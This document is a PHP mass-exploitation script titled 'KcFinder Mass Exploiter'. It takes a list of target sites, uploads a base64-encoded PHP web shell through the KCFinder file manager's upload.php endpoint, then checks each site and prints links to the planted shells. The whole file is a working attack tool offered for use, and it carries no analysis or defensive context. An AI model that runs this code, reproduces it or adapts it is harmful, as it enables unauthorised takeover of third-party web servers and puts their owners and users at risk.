<head><title>KcFinder Mass Exploiter</title></head>
<center><form method="post">
<textarea class='form-control con7' name="perawan" placeholder="http://korban.com/kcfinder/upload.php" cols='50' rows='12'></textarea><br>
<input type="submit" name="ikkeh" value="Jancuk">
</form>
</html>
</form>
<?php
set_time_limit(0);
error_reporting(0);
function curl($url, $payload) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, $url);
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
$memegnya = explode("\r\n", $_POST['perawan']);
$jancok = $_POST['ikkeh'];
$upload = base64_decode("PD9waHAgaWYoaXNzZXQoJF9GSUxFU1sna29udG9sJ11bJ25hbWUnXSkpeyRuYW1lID0gJF9GSUxFU1sna29udG9sJ11bJ25hbWUnXTskYmFuZ3NhdCA9ICRfRklMRVNbJ2tvbnRvbCddWyd0bXBfbmFtZSddO0Btb3ZlX3VwbG9hZGVkX2ZpbGUoJGJhbmdzYXQsICRuYW1lKTsgZWNobyAkbmFtZTt9ZWxzZXsgZWNobyAiPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1rb250b2w+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pj4nPiI7DQp9IA0KPz4=");
if($jancok) {
	$shell = "kecoak.php.phpgif";
	$fopen = fopen($shell, "w");
	fwrite($fopen, $upload);
	fclose($fopen);
	foreach($memegnya as $url) {
		$target = $url;
        $brudul = str_replace("upload.php", "upload/", $url);
		$data = array(
			"Filedata" => "@$shell"
			);
		$curl = curl($target, $data);
		if($curl) {
            $ngecheck = @file_get_contents("$brudul/files/$shell");
			if(preg_match("/>>>/", $ngecheck)) {
                        echo "  [+] <font color=green>Success</font> => <a href='$brudul/files/$shell' target='_blank'>$brudul/files$shell</a><br>";	
               } else {
                       echo "[-] <font color=red>Gagal</font> => $url<br>";
             }
	}
    }
}
?>